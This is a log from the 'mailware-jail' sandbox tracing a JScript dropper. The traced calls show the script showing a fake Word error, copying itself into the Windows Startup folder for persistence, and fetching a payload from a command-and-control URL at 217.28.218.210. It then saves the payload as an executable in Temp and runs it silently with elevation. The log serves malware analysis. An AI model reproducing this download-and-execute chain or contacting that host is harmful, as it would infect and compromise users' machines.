18 Dec 19:35:21 - mailware-jail, a malware sandbox ver. 0.12
18 Dec 19:35:21 - ------------------------
18 Dec 19:35:21 - Sandbox environment sequence: env/utils.js,env/eval.js,env/function.js,env/wscript.js,env/other.js,env/console.js
18 Dec 19:35:21 - Malware files: malware/20161216/malware2.js
18 Dec 19:35:21 - Output file for sandbox dump: sandbox_dump_after.json
18 Dec 19:35:21 - Output directory for generated files: output/
18 Dec 19:35:21 - Download from remote server: false
18 Dec 19:35:21 - ==> Preparing Sandbox environment.
18 Dec 19:35:21 -  => Executing: env/utils.js quitely
18 Dec 19:35:21 -  => Executing: env/eval.js quitely
18 Dec 19:35:21 -  => Executing: env/function.js quitely
18 Dec 19:35:21 -  => Executing: env/wscript.js quitely
18 Dec 19:35:21 -  => Executing: env/other.js quitely
18 Dec 19:35:21 -  => Executing: env/console.js quitely
18 Dec 19:35:21 - ==> Executing malware file(s). =========================================
18 Dec 19:35:21 -  => Executing: malware/20161216/malware2.js verbosely, reporting silent catches
18 Dec 19:35:21 - Saving: output/malware_20161216_malware2.js
18 Dec 19:35:21 - Saving: output/tr_malware_20161216_malware2.js
18 Dec 19:35:21 - WScript.scriptfullname = (string) 'malware/20161216/malware2.js'
18 Dec 19:35:21 - WScript.arguments = (object) 'malware/20161216/malware2.js,xyz'
18 Dec 19:35:21 - WScript.CreateObject(WScript.Shell)
18 Dec 19:35:21 - new WScript.Shell[2]
18 Dec 19:35:21 - ActiveXObject(Scripting.FileSystemObject)
18 Dec 19:35:21 - new Scripting.FileSystemObject[3]
18 Dec 19:35:21 - ActiveXObject(ADODB.Stream)
18 Dec 19:35:21 - new ADODB_Stream[4]
18 Dec 19:35:21 - ActiveXObject(Shell.Application)
18 Dec 19:35:21 - new Shell.Application[5]
18 Dec 19:35:21 - WScript.Shell[2].ExpandEnvironmentStrings(%TEMP%) => C:\Users\User\AppData\Local\Temp
18 Dec 19:35:21 - ActiveXObject(Msxml2.ServerXMLHTTP)
18 Dec 19:35:21 - new MSXML2.XMLHTTP[6]
18 Dec 19:35:21 - MSXML2.XMLHTTP[6].onreadystatechange = (undefined) 'undefined'
18 Dec 19:35:21 - new Folder2[7](C:\Users\User\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup)
18 Dec 19:35:21 - new FolderItem[8](C:\Users\User\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup)
18 Dec 19:35:21 - FolderItem[8](C:\Users\User\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup).name = (string) 'C:\Users\User\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup'
18 Dec 19:35:21 - FolderItem[8](C:\Users\User\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup).path = (string) 'C:\Users\User\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup'
18 Dec 19:35:21 - Folder2[7](C:\Users\User\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup).self = (object) 'FolderItem[8](C:\Users\User\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup)'
18 Dec 19:35:21 - Shell.Application[5].Namespace(7) => Folder2[7](C:\Users\User\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup)
18 Dec 19:35:21 - WScript.scriptfullname.get() => (string) 'malware/20161216/malware2.js'
18 Dec 19:35:21 - Folder2[7](C:\Users\User\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup).self.get() => (object) 'FolderItem[8](C:\Users\User\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup)'
18 Dec 19:35:21 - FolderItem[8](C:\Users\User\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup).path.get() => (string) 'C:\Users\User\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup'
18 Dec 19:35:21 - WScript.Popup(Word cannot open the document: user does not have access privileges,473,Error:,16)
18 Dec 19:35:21 - Scripting.FileSystemObject[3].CopyFile(malware/20161216/malware2.js, C:\Users\User\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\plugins.refresh.jse)
18 Dec 19:35:21 - Scripting.FileSystemObject[3].DeleteFile(malware/20161216/malware2.js)
18 Dec 19:35:29 - MSXML2.XMLHTTP[6].setOption(3,MSXML)
18 Dec 19:35:29 - MSXML2.XMLHTTP[6].open(GET,https://217.28.218.210:4433/C1/ostap.php?add=theleadingfigureofabstractexpressionism&70&uid=1715861367&out=0&ver=20,false)
18 Dec 19:35:29 - MSXML2.XMLHTTP[6].method = (string) 'GET'
18 Dec 19:35:29 - MSXML2.XMLHTTP[6].url = (string) 'https://217.28.218.210:4433/C1/ostap.php?add=theleadingfigureofabstractexpressionism&70&uid=1715861367&out=0&ver=20'
18 Dec 19:35:29 - MSXML2.XMLHTTP[6].async = (boolean) 'false'
18 Dec 19:35:29 - MSXML2.XMLHTTP[6].async.get() => (boolean) 'false'
18 Dec 19:35:29 - MSXML2.XMLHTTP[6].send(undefined)
18 Dec 19:35:29 - MSXML2.XMLHTTP[6] Not sending data, if you want to interact with remote server, set --down
18 Dec 19:35:29 - MSXML2.XMLHTTP[6].responsebody = (string) 'MZDumy conntent, use --down to download the real payload.?Dumy conntent, use --down to download the real payload.?Dumy conntent, use --down to download the real payload.?Dumy conntent, use --down to download the real payload.?Dumy conntent, use --dow ... (truncated)'
18 Dec 19:35:29 - MSXML2.XMLHTTP[6].status = (number) '200'
18 Dec 19:35:29 - MSXML2.XMLHTTP[6].readystate = (number) '4'
18 Dec 19:35:29 - MSXML2.XMLHTTP[6].onreadystatechange.get() => (undefined) 'undefined'
18 Dec 19:35:29 - MSXML2.XMLHTTP[6].send(undefined) finished
18 Dec 19:35:29 - MSXML2.XMLHTTP[6].status.get() => (number) '200'
18 Dec 19:35:29 - FileExists: false overridden with FileAlwaysExists: true
18 Dec 19:35:29 - Scripting.FileSystemObject[3].FileExists(C:\Users\User\AppData\Local\Temp\64.exe) => true
18 Dec 19:35:29 - Scripting.FileSystemObject[3].DeleteFile(C:\Users\User\AppData\Local\Temp\64.exe)
18 Dec 19:35:29 - FileExists: false overridden with FileAlwaysExists: true
18 Dec 19:35:29 - Scripting.FileSystemObject[3].FileExists(C:\Users\User\AppData\Local\Temp\205.cc1) => true
18 Dec 19:35:29 - Scripting.FileSystemObject[3].DeleteFile(C:\Users\User\AppData\Local\Temp\205.cc1)
18 Dec 19:35:29 - MSXML2.XMLHTTP[6].ResponseText.get() => (string) 'MZDumy conntent, use --down to download the real payload.?Dumy conntent, use --down to download the real payload.?Dumy conntent, use --down to download the real payload.?Dumy conntent, use --down to download the real payload.?Dumy conntent, use --dow ... (truncated)'
18 Dec 19:35:29 - ADODB_Stream[4].Open()
18 Dec 19:35:29 - ADODB_Stream[4].type = (number) '1'
18 Dec 19:35:29 - MSXML2.XMLHTTP[6].responsebody.get() => (string) 'MZDumy conntent, use --down to download the real payload.?Dumy conntent, use --down to download the real payload.?Dumy conntent, use --down to download the real payload.?Dumy conntent, use --down to download the real payload.?Dumy conntent, use --dow ... (truncated)'
18 Dec 19:35:29 - ADODB_Stream[4].content = (string) 'MZDumy conntent, use --down to download the real payload.?Dumy conntent, use --down to download the real payload.?Dumy conntent, use --down to download the real payload.?Dumy conntent, use --down to download the real payload.?Dumy conntent, use --dow ... (truncated)'
18 Dec 19:35:29 - ADODB_Stream[4].Write(str) - 11202 bytes
18 Dec 19:35:29 - ADODB_Stream[4].size = (number) '11202'
18 Dec 19:35:29 - ADODB_Stream[4].position = (number) '0'
18 Dec 19:35:29 - ADODB_Stream[4].SaveToFile(C:\Users\User\AppData\Local\Temp\64.exe, undefined)
18 Dec 19:35:29 - ADODB_Stream[4].content.get() => (string) 'MZDumy conntent, use --down to download the real payload.?Dumy conntent, use --down to download the real payload.?Dumy conntent, use --down to download the real payload.?Dumy conntent, use --down to download the real payload.?Dumy conntent, use --dow ... (truncated)'
18 Dec 19:35:29 - ADODB_Stream[4].Close()
18 Dec 19:35:29 - WScript.Sleep(30000)
18 Dec 19:35:59 - FileExists: false overridden with FileAlwaysExists: true
18 Dec 19:35:59 - Scripting.FileSystemObject[3].FileExists(C:\Users\User\AppData\Local\Temp\64.exe) => true
18 Dec 19:35:59 - Scripting.FileSystemObject[3].GetFile(C:\Users\User\AppData\Local\Temp\64.exe) => C:\Users\User\AppData\Local\Temp\64.exe
18 Dec 19:35:59 - new FileObject[9](C:\Users\User\AppData\Local\Temp\64.exe)
18 Dec 19:35:59 - FileObject[9](C:\Users\User\AppData\Local\Temp\64.exe).OpenAsTextStream(1)
18 Dec 19:35:59 - new TextStream[10]
18 Dec 19:35:59 - TextStream[10].ReadLine()
18 Dec 19:35:59 - WScript.Shell[2].Exec(C:\Users\User\AppData\Local\Temp\64.exe)
18 Dec 19:35:59 - new Process[11](C:\Users\User\AppData\Local\Temp\64.exe)
18 Dec 19:35:59 - Process[11](C:\Users\User\AppData\Local\Temp\64.exe).processid = (number) '11'
18 Dec 19:35:59 - new TextStream[12]
18 Dec 19:35:59 - Process[11](C:\Users\User\AppData\Local\Temp\64.exe).stdout = (object) 'TextStream[12]'
18 Dec 19:35:59 - new TextStream[13]
18 Dec 19:35:59 - Process[11](C:\Users\User\AppData\Local\Temp\64.exe).stderr = (object) 'TextStream[13]'
18 Dec 19:35:59 - new TextStream[14]
18 Dec 19:35:59 - Process[11](C:\Users\User\AppData\Local\Temp\64.exe).stdin = (object) 'TextStream[14]'
18 Dec 19:35:59 - Process[11](C:\Users\User\AppData\Local\Temp\64.exe).processid.get() => (number) '11'
18 Dec 19:35:59 - WScript.Sleep(10010)
18 Dec 19:36:09 - FileExists: false overridden with FileAlwaysExists: true
18 Dec 19:36:09 - Scripting.FileSystemObject[3].FileExists(C:\Users\User\AppData\Local\Temp\64.exe) => true
18 Dec 19:36:09 - Scripting.FileSystemObject[3].DeleteFile(C:\Users\User\AppData\Local\Temp\64.exe)
18 Dec 19:36:09 - TextStream[10].Close()
18 Dec 19:36:09 - WScript.Sleep(120000)
18 Dec 19:38:09 - MSXML2.XMLHTTP[6].setOption(3,MSXML)
18 Dec 19:38:09 - MSXML2.XMLHTTP[6].open(GET,https://217.28.218.210:4433/C1/ostap.php?add=theleadingfigureofabstractexpressionism&61&uid=1715861367&out=11&ver=20,false)
18 Dec 19:38:09 - MSXML2.XMLHTTP[6].method = (string) 'GET'
18 Dec 19:38:09 - MSXML2.XMLHTTP[6].url = (string) 'https://217.28.218.210:4433/C1/ostap.php?add=theleadingfigureofabstractexpressionism&61&uid=1715861367&out=11&ver=20'
18 Dec 19:38:09 - MSXML2.XMLHTTP[6].async = (boolean) 'false'
18 Dec 19:38:09 - MSXML2.XMLHTTP[6].async.get() => (boolean) 'false'
18 Dec 19:38:09 - MSXML2.XMLHTTP[6].send(undefined)
18 Dec 19:38:09 - MSXML2.XMLHTTP[6] Not sending data, if you want to interact with remote server, set --down
18 Dec 19:38:09 - MSXML2.XMLHTTP[6].responsebody = (string) 'MZDumy conntent, use --down to download the real payload.?Dumy conntent, use --down to download the real payload.?Dumy conntent, use --down to download the real payload.?Dumy conntent, use --down to download the real payload.?Dumy conntent, use --dow ... (truncated)'
18 Dec 19:38:09 - MSXML2.XMLHTTP[6].status = (number) '200'
18 Dec 19:38:09 - MSXML2.XMLHTTP[6].readystate = (number) '4'
18 Dec 19:38:09 - MSXML2.XMLHTTP[6].onreadystatechange.get() => (undefined) 'undefined'
18 Dec 19:38:09 - MSXML2.XMLHTTP[6].send(undefined) finished
18 Dec 19:38:09 - MSXML2.XMLHTTP[6].status.get() => (number) '200'
18 Dec 19:38:09 - WScript.Shell[2].RegRead(HKEY_CLASSES_ROOT\\http\\shell\\open\\command\\) => "C:\Chrome\chrome.exe" -url "%1"
18 Dec 19:38:09 - MSXML2.XMLHTTP[6].setOption(3,MSXML)
18 Dec 19:38:09 - MSXML2.XMLHTTP[6].open(GET,https://217.28.218.210:4433/C1/ostap.php?add=theleadingfigureofabstractexpressionism&54&uid=1715861367&out=11&ver=20&g=1,false)
18 Dec 19:38:09 - MSXML2.XMLHTTP[6].method = (string) 'GET'
18 Dec 19:38:09 - MSXML2.XMLHTTP[6].url = (string) 'https://217.28.218.210:4433/C1/ostap.php?add=theleadingfigureofabstractexpressionism&54&uid=1715861367&out=11&ver=20&g=1'
18 Dec 19:38:09 - MSXML2.XMLHTTP[6].async = (boolean) 'false'
18 Dec 19:38:09 - MSXML2.XMLHTTP[6].async.get() => (boolean) 'false'
18 Dec 19:38:09 - MSXML2.XMLHTTP[6].send(undefined)
18 Dec 19:38:09 - MSXML2.XMLHTTP[6] Not sending data, if you want to interact with remote server, set --down
18 Dec 19:38:09 - MSXML2.XMLHTTP[6].responsebody = (string) 'MZDumy conntent, use --down to download the real payload.?Dumy conntent, use --down to download the real payload.?Dumy conntent, use --down to download the real payload.?Dumy conntent, use --down to download the real payload.?Dumy conntent, use --dow ... (truncated)'
18 Dec 19:38:09 - MSXML2.XMLHTTP[6].status = (number) '200'
18 Dec 19:38:09 - MSXML2.XMLHTTP[6].readystate = (number) '4'
18 Dec 19:38:09 - MSXML2.XMLHTTP[6].onreadystatechange.get() => (undefined) 'undefined'
18 Dec 19:38:09 - MSXML2.XMLHTTP[6].send(undefined) finished
18 Dec 19:38:09 - MSXML2.XMLHTTP[6].status.get() => (number) '200'
18 Dec 19:38:09 - FileExists: false overridden with FileAlwaysExists: true
18 Dec 19:38:09 - Scripting.FileSystemObject[3].FileExists(C:\Users\User\AppData\Local\Temp\64.exe.exe) => true
18 Dec 19:38:09 - Scripting.FileSystemObject[3].DeleteFile(C:\Users\User\AppData\Local\Temp\64.exe.exe)
18 Dec 19:38:09 - FileExists: false overridden with FileAlwaysExists: true
18 Dec 19:38:09 - Scripting.FileSystemObject[3].FileExists(C:\Users\User\AppData\Local\Temp\205.cc1) => true
18 Dec 19:38:09 - Scripting.FileSystemObject[3].DeleteFile(C:\Users\User\AppData\Local\Temp\205.cc1)
18 Dec 19:38:09 - MSXML2.XMLHTTP[6].ResponseText.get() => (string) 'MZDumy conntent, use --down to download the real payload.?Dumy conntent, use --down to download the real payload.?Dumy conntent, use --down to download the real payload.?Dumy conntent, use --down to download the real payload.?Dumy conntent, use --dow ... (truncated)'
18 Dec 19:38:09 - ADODB_Stream[4].Open()
18 Dec 19:38:09 - ADODB_Stream[4].type = (number) '1'
18 Dec 19:38:09 - MSXML2.XMLHTTP[6].responsebody.get() => (string) 'MZDumy conntent, use --down to download the real payload.?Dumy conntent, use --down to download the real payload.?Dumy conntent, use --down to download the real payload.?Dumy conntent, use --down to download the real payload.?Dumy conntent, use --dow ... (truncated)'
18 Dec 19:38:09 - ADODB_Stream[4].content = (string) 'MZDumy conntent, use --down to download the real payload.?Dumy conntent, use --down to download the real payload.?Dumy conntent, use --down to download the real payload.?Dumy conntent, use --down to download the real payload.?Dumy conntent, use --dow ... (truncated)'
18 Dec 19:38:09 - ADODB_Stream[4].Write(str) - 11202 bytes
18 Dec 19:38:09 - ADODB_Stream[4].size = (number) '11202'
18 Dec 19:38:09 - ADODB_Stream[4].position = (number) '0'
18 Dec 19:38:09 - ADODB_Stream[4].SaveToFile(C:\Users\User\AppData\Local\Temp\64.exe.exe, undefined)
18 Dec 19:38:09 - ADODB_Stream[4].content.get() => (string) 'MZDumy conntent, use --down to download the real payload.?Dumy conntent, use --down to download the real payload.?Dumy conntent, use --down to download the real payload.?Dumy conntent, use --down to download the real payload.?Dumy conntent, use --dow ... (truncated)'
18 Dec 19:38:09 - ADODB_Stream[4].Close()
18 Dec 19:38:09 - WScript.Sleep(30000)
18 Dec 19:38:39 - FileExists: false overridden with FileAlwaysExists: true
18 Dec 19:38:39 - Scripting.FileSystemObject[3].FileExists(C:\Users\User\AppData\Local\Temp\64.exe.exe) => true
18 Dec 19:38:39 - Scripting.FileSystemObject[3].GetFile(C:\Users\User\AppData\Local\Temp\64.exe.exe) => C:\Users\User\AppData\Local\Temp\64.exe.exe
18 Dec 19:38:39 - new FileObject[15](C:\Users\User\AppData\Local\Temp\64.exe.exe)
18 Dec 19:38:39 - FileObject[15](C:\Users\User\AppData\Local\Temp\64.exe.exe).OpenAsTextStream(1)
18 Dec 19:38:39 - new TextStream[16]
18 Dec 19:38:39 - TextStream[16].ReadLine()
18 Dec 19:38:39 - Shell.Application[5].ShellExecute(C:\Users\User\AppData\Local\Temp\64.exe.exe,/silent /install,,runas,1)
18 Dec 19:38:39 - ==> Cleaning up sandbox.
18 Dec 19:38:39 - ==> Script execution finished, dumping sandbox environment to a file.
18 Dec 19:38:39 - The sandbox context has been  saved to: sandbox_dump_after.json
18 Dec 19:38:39 - Saving: output/C__Users_User_AppData_Local_Temp_64.exe
18 Dec 19:38:39 - Saving: output/C__Users_User_AppData_Local_Temp_64.exe.exe
